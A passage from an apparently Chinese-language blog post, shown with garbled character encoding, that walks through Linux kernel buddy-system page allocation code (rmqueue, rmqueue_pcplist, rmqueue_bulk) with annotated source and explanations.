è¡¨ç¤ºæˆ‘ä»¬ç»ˆäºé€šè¿‡äº†å‰é¢ä¸€ç³»åˆ—çš„å„ç§æ£€æŸ¥ï¼Œç°åœ¨å¼€å§‹æ­£å¼è¿›è¡Œé¡µé¢åˆ†é…</span><br>        <span class="hljs-comment">// **************************</span><br>        <span class="hljs-comment">// rmqueue() å³ä¸ºæˆ‘ä»¬åœ¨OSæ•™ç§‘ä¹¦ä¸Šçœ‹åˆ°çš„çš„ buddy system æ¨¡å‹,</span><br>        <span class="hljs-comment">// å– freelist å¯¹åº”ä¸‹æ ‡ pageï¼Œè‹¥æ— åˆ™å‘ä¸Šéå†æ‹†æ›´é«˜ order çš„ page</span><br>        <span class="hljs-comment">// **************************</span><br>page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,<br>gfp_mask, alloc_flags, ac-&gt;migratetype);<br><span class="hljs-keyword">if</span> (page) &#123;<br>prep_new_page(page, order, gfp_mask, alloc_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥è¿™æ˜¯ä¸€ä¸ªé«˜é˜¶çš„åŸå­åˆ†é…ï¼Œ</span><br><span class="hljs-comment"> * æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦è¯¥ä¸ºå°†æ¥ä¿ç•™ pageblock</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))<br>reserve_highatomic_pageblock(page, zone, order);<br><br><span class="hljs-keyword">return</span> page;<span class="hljs-comment">// å–åˆ°äº†ï¼Œè¿”å›</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// æ²¡å–åˆ°</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/* è‹¥è¯¥ zone æœ‰ deferred pagesï¼Œå†è¯•ä¸€é */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åœ¨ä¸€å° UMA æœºå™¨ä¸Šå¯èƒ½æ‰€ä»¥çš„ zone éƒ½æ˜¯ç ´ç¢çš„ï¼Œ</span><br><span class="hljs-comment"> * è‹¥é¿å…ç¢ç‰‡, é‡ç½®å¹¶é‡è¯•.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (no_fallback) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æµç¨‹æ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li><p><code>for_next_zone_zonelist_nodemask</code> è¿­ä»£éå†åˆ†é…ä¸Šä¸‹æ–‡ä¸­ zonelist ä¸­çš„ zoneref æ•°ç»„ å¯¹åº”çš„ zone</p><blockquote><p>å…¶æ ¸å¿ƒæ˜¯å•æ¬¡è¿­ä»£è°ƒç”¨ next_zones_zonelist()ï¼Œè¯¥å‡½æ•°è¿”å›:</p><ul><li>åœ¨ nodemask çš„ zone ä¸­ï¼Œä»¥å½“å‰ zone ä½œä¸ºèµ·ç‚¹æ¸¸æ ‡çš„ã€ä½äºæˆ–ä½äºã€‘highest_zoneidx çš„ä¸‹ä¸€ä¸ª zone</li></ul></blockquote><ul><li><p>è‹¥å¼€å¯äº† cpusetï¼Œæ£€æŸ¥å½“å‰ zone æ˜¯å¦æ»¡è¶³ cpuset çš„è¦æ±‚ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</p></li><li><p>æ£€æŸ¥å½“å‰ zone å¯¹åº” node çš„è„é¡µæ•°é‡æ˜¯å¦è¶…å‡ºé™åˆ¶ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</p></li><li><p>è‹¥ <code>ALLOC_NOFRAGMENT</code> ä½†æ˜¯å½“å‰ zone é preferred zoneã€ä¸”å¯¹åº” node ä¸º remote nodeï¼Œåˆ™æ¸…é™¤è¯¥æ ‡å¿—ä½å<strong>é‡æ–°å¼€å§‹åˆ†é…</strong>ï¼Œå› ä¸º locality æ¯”é¿å…ç¢ç‰‡æ›´åŠ é‡è¦</p></li><li><p>è·å–å½“å‰ zone çš„æ°´ä½çº¿æ ‡è®°</p><ul><li>è‹¥æ˜¯è®¾ç½®äº† <code>ALLOC_NO_WATERMARKS</code> åˆ™ç›´æ¥åˆ°ä¸‹ä¸€æ­¥è¿›è¡Œåˆ†é…</li><li>è‹¥æ°´ä½çº¿æ£€æŸ¥æœªé€šè¿‡ï¼Œè°ƒç”¨ <code>node_reclaim()</code> è¿›è¡Œé¡µé¢å›æ”¶</li><li>è‹¥å›æ”¶åé¡µé¢è¿˜æ˜¯ä¸è¶³ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</li></ul></li><li><p>è°ƒç”¨ <code>rmqueue()</code> æ­£å¼è¿›è¡Œå†…å­˜åˆ†é…ï¼Œè¯¥å‡½æ•°å³ä¸º buddy system åˆ†é…ç®—æ³•</p></li></ul></li></ul><p><img src="https://s2.loli.net/2022/07/05/SJMKys31ofnTPXc.png" alt="å·çš„å›¾.png"></p><h4 id="rmqueue-ï¼šä»ç»™å®šçš„-page-ä¸­è¿›è¡Œé¡µé¢åˆ†é…">rmqueue()ï¼šä»ç»™å®šçš„ page ä¸­è¿›è¡Œé¡µé¢åˆ†é…</h4><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦æ˜¯ä»ç»™å®š zone ä¸­è¿›è¡Œå†…å­˜åˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä»ç»™å®š zone ä¸­è¿›è¡Œå†…å­˜åˆ†é…. å¯¹äº order-0 çš„åˆ†é…åˆ™ä½¿ç”¨ pcplists.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfp_flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (likely(order == <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_MOVABLE çš„ pcplist å¯èƒ½åœ¨ CMA åŒºåŸŸæœ‰ç€é¡µé¢ï¼Œ</span><br><span class="hljs-comment"> * å½“ä» CMA çš„åˆ†é…ä¸è¢«å…è®¸æ—¶æˆ‘ä»¬éœ€è¦ç•¥è¿‡å®ƒ</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// å¯¹äº order-0 çš„åˆ†é…ï¼Œ</span><br>        <span class="hljs-comment">// è‹¥æ²¡æœ‰å¼€å¯ CMA | è®¾ç½®äº† ALLOC_CMA | è¿ç§»ç±»å‹é MIGRATE_MOVABLE</span><br>        <span class="hljs-comment">// åˆ™å…ˆä» pcplist ä¸Šåˆ†é…</span><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||<br>migratetype != MIGRATE_MOVABLE) &#123;<br>page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬ç»ä¸å¸Œæœ› callers å°è¯•</span><br><span class="hljs-comment"> * åœ¨å¸¦æœ‰ __GFP_NOFAIL æ—¶åˆ†é…å¤§äº order-1 çš„é¡µ</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="hljs-number">1</span>));<br>spin_lock_irqsave(&amp;zone-&gt;lock, flags);<br><br><span class="hljs-keyword">do</span> &#123;<br>page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ç”±äºéCMAçš„åˆ†é…ä¸Šä¸‹æ–‡å¯¼è‡´ç•¥è¿‡äº† pcplistï¼Œåˆ™order-0 çš„è¯·æ±‚å¯ä»¥åˆ°è¾¾æ­¤å¤„.</span><br><span class="hljs-comment"> * HIGHATOMIC åŒºåŸŸä¸ºæ›´é«˜ order çš„åŸå­åˆ†é…æ‰€ä¿ç•™ï¼Œ</span><br><span class="hljs-comment"> * æ•… order-0 çš„è¯·æ±‚åº”ç•¥è¿‡å®ƒã€‚</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// è‹¥ order &gt; 0 ä¸”å¸¦æœ‰ ALLOC_HARDER æ ‡å¿—ä½ï¼Œè°ƒç”¨ __rmqueue_smallest() åˆ†é…</span><br>        <span class="hljs-comment">// è¿™ä¸ªæ ‡å¿—ä½æ„ä¸ºå°†æ°´ä½çº¿å‡å» 1/4ï¼Œå®é™…ä¸Š GFP_ATOMIC ä¸­ä¾¿ä¼šåŒ…å«è¯¥æ ‡å¿—ä½</span><br><span class="hljs-keyword">if</span> (order &gt; <span class="hljs-number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;<br>page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br>&#125;<br>        <span class="hljs-comment">// è°ƒç”¨ __rmqueue() è¿›è¡Œåˆ†é…ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•°äº†</span><br><span class="hljs-keyword">if</span> (!page)<br>page = __rmqueue(zone, order, migratetype, alloc_flags);<br>&#125; <span class="hljs-keyword">while</span> (page &amp;&amp; check_new_pages(page, order)); <span class="hljs-comment">// è¿™ä¸ªæ£€æŸ¥å‡½æ•°é€šè¿‡äº†è¿”å›false</span><br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">goto</span> failed;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>  get_pcppage_migratetype(page));<br><br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span> &lt;&lt; order);<br>zone_statistics(preferred_zone, zone);<br>local_irq_restore(flags);<br><br>out:<br><span class="hljs-comment">/* Separate test+clear to avoid unnecessary atomics */</span><br><span class="hljs-keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;<br>clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);<br>wakeup_kswapd(zone, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, zone_idx(zone));<br>&#125;<br><br>VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);<br><span class="hljs-keyword">return</span> page;<br><br>failed:<br>local_irq_restore(flags);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æå‡½æ•°æµç¨‹å‰æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹è¿™ä¸ªæ¦‚å¿µâ€”â€”<code>per-cpu pageset</code> ï¼Œè¿™æ˜¯ zone ä¸Šçš„ä¸€ä¸ª per-cpu çš„é¡µé¢é›†ï¼Œåœ¨åˆ†é…æ—¶ä¼šä¼˜å…ˆä»è¿™é‡Œè¿›è¡Œåˆ†é…</p><p>è¯¥å‡½æ•°å…¶å®è¿˜æ˜¯å¯¹åˆ†é…çš„æ ¸å¿ƒé€»è¾‘çš„å°è£…ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹æµç¨‹ï¼š</p><ul><li>åˆ†é…çš„ order ä¸º 0ï¼Œè‹¥æ²¡æœ‰å¼€å¯ CMA | è®¾ç½®äº† ALLOC_CMA | è¿ç§»ç±»å‹é MIGRATE_MOVABLEï¼Œåˆ™å°è¯•ä» per-cpu pageset ä¸­åˆ†é…å¹¶è¿”å›</li><li>order &gt; 0ï¼Œè°ƒç”¨ <code>__rmqueue_smallest()</code> è¿›è¡Œé¡µé¢åˆ†é…</li><li>ä¹‹å‰æœªåˆ†é…æˆåŠŸï¼Œè°ƒç”¨ <code>__rmqueue()</code> è¿›è¡Œé¡µé¢åˆ†é…</li><li>ç»“æœæ£€æŸ¥ï¼Œå…¶ä¸­å¾ªç¯å†…æ˜¯ç”¨ <code>check_new_pages()</code>ï¼Œæœªé€šè¿‡åˆ™é‡æ–°å¾ªç¯ï¼ˆå›åˆ°ç¬¬äºŒæ­¥ï¼‰</li></ul><h5 id="â‘ -rmqueue-pcplist-ï¼šä»-per-cpu-pageset-ä¸Šåš-order-0-çš„åˆ†é…">â‘  rmqueue_pcplist()ï¼šä» per-cpu pageset ä¸Šåš order-0 çš„åˆ†é…</h5><p>ä¸»è¦æ˜¯å…³ä¸­æ–­â†’é¡µé¢åˆ†é…â†’å¼€ä¸­æ–­ä¸‰æ­¥èµ°ï¼Œæœ€ååˆ†é…è°ƒç”¨åˆ°çš„æ˜¯ <code>__rmqueue_pcplist()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Lock and remove page from the per-cpu list */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue_pcplist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">gfp_t</span> gfp_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>local_irq_save(flags); <span class="hljs-comment">// å…³ä¸­æ–­</span><br>pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;<br><span class="hljs-built_in">list</span> = &amp;pcp-&gt;lists[migratetype]; <span class="hljs-comment">// è·å–è¿ç§»ç±»å‹é“¾è¡¨</span><br>page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="hljs-built_in">list</span>); <span class="hljs-comment">// åˆ†é…</span><br><span class="hljs-keyword">if</span> (page) &#123;<br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span>);<br>zone_statistics(preferred_zone, zone);<br>&#125;<br>local_irq_restore(flags); <span class="hljs-comment">// å¼€ä¸­æ–­</span><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__rmqueue_pcplist()</code> ä¸»è¦å°±æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œè‹¥ pcplist ä¸ºç©ºåˆ™è°ƒç”¨ <code>rmqueue_bulk()</code> å…ˆä» zone ä¸Šæ‹¿ pagesï¼Œä¹‹åå°±æ˜¯ç®€å•çš„é“¾è¡¨è„±é“¾ï¼Œåˆ†é…ç»“æœä½¿ç”¨ <code>check_new_page()</code> è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* ä» per-cpu é“¾è¡¨ä¸Šå–å‡º page, è°ƒç”¨è€…å¿…é¡»ä¿æŠ¤é“¾è¡¨ */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_pcplist</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (list_empty(<span class="hljs-built_in">list</span>)) &#123; <span class="hljs-comment">// list æ˜¯ç©ºçš„</span><br>            <span class="hljs-comment">// </span><br>pcp-&gt;count += rmqueue_bulk(zone, <span class="hljs-number">0</span>,<br>READ_ONCE(pcp-&gt;batch), <span class="hljs-built_in">list</span>,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(list_empty(<span class="hljs-built_in">list</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>        <span class="hljs-comment">// é“¾è¡¨è„±é“¾</span><br>page = list_first_entry(<span class="hljs-built_in">list</span>, <span class="hljs-keyword">struct</span> page, lru);<br>list_del(&amp;page-&gt;lru);<br>pcp-&gt;count--;<br>&#125; <span class="hljs-keyword">while</span> (check_new_pcp(page));<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>rmqueue_bulk()</code> åˆ™æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>__rmqueue()</code> ä¸º pcplist è¿›è¡Œ <code>pcp-&gt;batch</code> æ¬¡çš„ order-0 çš„é¡µé¢åˆ†é…ï¼Œå¹¶å»ºç«‹é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ºäº†é«˜æ•ˆç‡ï¼Œä» buddy åˆ†é…å™¨è·å¾—æŒ‡å®šæ•°é‡çš„å…ƒç´ , </span><br><span class="hljs-comment"> * æ‰€æœ‰çš„å•ä¸ªå…ƒç´ éƒ½åœ¨æŒæœ‰é”çš„æƒ…å†µä¸‹è¿›è¡Œ.  å°†å…¶æ·»åŠ åˆ°æä¾›çš„é“¾è¡¨ä¸­.</span><br><span class="hljs-comment"> * è¿”å›æ”¾ç½®åœ¨ *list é“¾è¡¨ä¸Šçš„ pages æ•°é‡.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rmqueue_bulk</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> count, <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-type">int</span> i, alloced = <span class="hljs-number">0</span>;<br><br>spin_lock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; count; ++i) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> __rmqueue(zone, order, migratetype,<br>alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(page == <span class="hljs-literal">NULL</span>))<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (unlikely(check_pcp_refill(page)))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”± expand() è¿”å›çš„åˆ†å‰² buddy é¡µé¢åœ¨æ­¤å¤„ä»¥ç‰©ç†é¡µæ¡†é¡ºåºæ¥æ”¶ã€‚</span><br><span class="hljs-comment"> * é¡µé¢è¢«æ·»åŠ åˆ° caller çš„é“¾è¡¨å°¾éƒ¨ã€‚ä» caller çš„è§’åº¦çœ‹ï¼Œé“¾è¡¨åœ¨</span><br><span class="hljs-comment"> * æŸäº›æƒ…å†µä¸‹æ˜¯æŒ‰ç…§é¡µç æ’åºçš„ã€‚è¿™å¯¹ä¸€äº›å¯ä»¥ä»å¤´éƒ¨å‰å‘çš„IOè®¾å¤‡æ˜¯æœ‰ç”¨çš„ï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºé“¾è¡¨ä¹Ÿæ˜¯åœ¨ç‰©ç†é¡µçš„é¡ºåºä¸Šçš„ã€‚è¿™å¯¹äºå¯ä»¥åœ¨ç‰©ç†é¡µåˆç†æ’åºçš„æƒ…å†µä¸‹</span><br><span class="hljs-comment"> * åˆå¹¶IOè¯·æ±‚çš„IOè®¾å¤‡æ˜¯æœ‰ç”¨çš„ã€‚</span><br><span class="hljs-comment"> */</span><br>list_add_tail(&amp;page-&gt;lru, <span class="hljs-built_in">list</span>);<br>alloced++;<br><span class="hljs-keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))<br>__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,<br>      -(<span class="hljs-number">1</span> &lt;&lt; order));<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * i pages were removed from the buddy list even if some leak due</span><br><span class="hljs-comment"> * to check_pcp_refill failing so adjust NR_FREE_PAGES based</span><br><span class="hljs-comment"> * on i. Do not confuse with &#x27;alloced&#x27; which is the number of</span><br><span class="hljs-comment"> * pages added to the pcp list.</span><br><span class="hljs-comment"> */</span><br>__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));<br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">return</span> alloced;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="â‘¡-rmqueue-smallest-ï¼šéå†æŒ‡å®š-migrationtype-é“¾è¡¨çš„-buddy-ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰">â‘¡ __rmqueue_smallest()ï¼šéå†æŒ‡å®š migrationtype é“¾è¡¨çš„ buddy ç®—æ³•ï¼ˆæ ¸å¿ƒä¸­çš„æ ¸å¿ƒï¼‰</h5><p>æˆ‘ä»¬é‡æ–°æ¥å›é¡¾ä¸€ä¸‹ <code>free_area</code> çš„ç»“æ„ï¼Œåœ¨å…¶ä¸­æ ¹æ®è¿ç§»ç±»å‹åˆ†æˆäº†å¤šä¸ªé“¾è¡¨ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>è€Œä¸€ä¸ª zone æ˜¯ç”±å¤šä¸ª <code>free_area</code> ç»„æˆçš„ï¼Œä¸€ä¸ª <code>free_area</code> å¯¹åº”ä¸€ä¸ª orderï¼Œé‚£ä¹ˆå¯¹äºè¯¥å‡½æ•°è€Œè¨€å…¶åªä¼šéå†ç‰¹å®šçš„ orderï¼Œé‚£ä¹ˆå°±æˆäº†ä¸‹é¢çš„æ¨¡å‹ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä»¥æ¥çœ‹è¿™ä¸ªå‡½æ•°äº†ï¼šä»å¾…åˆ†é… order æ‰€å¯¹åº”çš„ <code>free_area</code> çš„æŒ‡å®šçš„ migration type é“¾è¡¨ä¸Šåˆ†é…ï¼Œè‹¥ä¸å¤Ÿåˆ™ä¸€ç›´å‘æ›´é«˜ order è¿›è¡Œåˆ†é…åå¯¹åŠå‘ä¸‹æ‹†åˆ°ä½ orderï¼Œè¿™é‡Œå‘æ›´é«˜ order åˆ†é…æ˜¯é€šè¿‡ç®€å•çš„å¾ªç¯ + é“¾è¡¨è„±é“¾æ“ä½œå®Œæˆçš„ï¼Œè€Œæ‹†é«˜é˜¶ page çš„æ“ä½œåˆ™æ˜¯é€šè¿‡ <code>expand()</code> å®Œæˆçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 